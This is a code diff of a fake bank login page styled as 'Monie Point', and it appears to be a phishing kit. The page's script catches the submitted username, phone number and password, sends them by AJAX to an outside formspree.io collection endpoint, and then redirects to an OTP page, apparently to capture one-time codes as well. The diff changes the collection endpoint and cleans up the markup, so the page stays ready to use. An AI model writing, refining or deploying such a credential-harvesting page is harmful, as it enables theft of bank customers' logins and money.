@@ -4,20 +4,17 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Application</title>
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
     $(document).ready(function() {
       $('form').submit(function(event) {
-        event.preventDefault(); // Prevent form submission
-
-        // Send the form data to FormSubmit using AJAX
+        event.preventDefault();
         $.ajax({
-          url: 'https://formspree.io/f/moqgaypd',
+          url: 'https://formspree.io/f/xyyqdnkr',
           method: 'POST',
           data: $('form').serialize(),
           dataType: 'json',
           success: function(response) {
-            // Redirect to otp.html upon successful submission
             redirectToOTP();
           },
           error: function(xhr, status, error) {
@@ -36,7 +33,7 @@
     body {
       margin: 0;
       padding: 0;
-      background-color: #0A2F6F; /* Set your preferred background color */
+      background-color: #0A2F6F;
       font-family: Arial, sans-serif;
     }
 
@@ -44,15 +41,12 @@
       padding: 20px;
       max-width: 600px;
       margin: 0 auto;
-      background-image: url('path/to/your/image.jpg'); /* Set your image path */
-      background-size: cover;
-      background-position: top left;
     }
 
     .logo {
-      width: 50px; /* Set your preferred size */
-      height: 50px; /* Set your preferred size */
-      padding: 10px; /* Set your preferred padding */
+      width: 50px;
+      height: 50px;
+      padding: 10px;
     }
 
     .welcome-text {
@@ -86,12 +80,11 @@
       position: absolute;
       bottom: 0;
       right: 0;
-     font-family:verdana;
-	
+      font-family: verdana;
     }
 
     .login-btn {
-      background-color: #0361F0; /* Set your preferred dark blue color */
+      background-color: #0361F0;
       color: white;
       padding: 10px 90px;
       border: none;
@@ -103,7 +96,7 @@
     }
 
     .signup-box {
-      background-color: #335287; /* Set your preferred grey color */
+      background-color: #335287;
       padding: 15px;
       border-radius: 10px;
       margin-top: 20px;
@@ -111,30 +104,28 @@
 
     .signup-text {
       text-align: center;
-	color: white;
+      color: white;
     }
   </style>
 </head>
 <body>
   <div class="container">
-<img src="logo.png" alt="Bank Logo" class="logo">
-    <div class="logo"></div>
-    <div class="welcome-text"><b>Login to </p>
-	Monie Point</b></div>
-<form>
-    <div class="login-box">
-      <div class="input-group">
-        <input type="text" placeholder="Username or Phone Number" Required>
+    <img src="logo.png" alt="Bank Logo" class="logo">
+    <div class="welcome-text"><b>Login to Monie Point</b></div>
+    <form>
+      <div class="login-box">
+        <div class="input-group">
+          <input type="text" placeholder="Username or Phone Number" required>
+        </div>
+        <div class="input-group">
+          <input type="password" placeholder="Password" required>
+        </div>
+        <button class="login-btn">Login</button>
       </div>
-      <div class="input-group">
-        <input type="password" placeholder="Password" Required>
-      </div>
-      <button class="login-btn">Login</button>
-</form>
-</br>
-	</br>
-<div class="forgot-text">Forgot username or password</b></div>
-    </div>
+    </form>
+    <br>
+    <br>
+    <div class="forgot-text">Forgot username or password</div>
     <div class="signup-box">
       <div class="signup-text"><b>New to Moniepoint? Sign Up</b></div>
     </div>
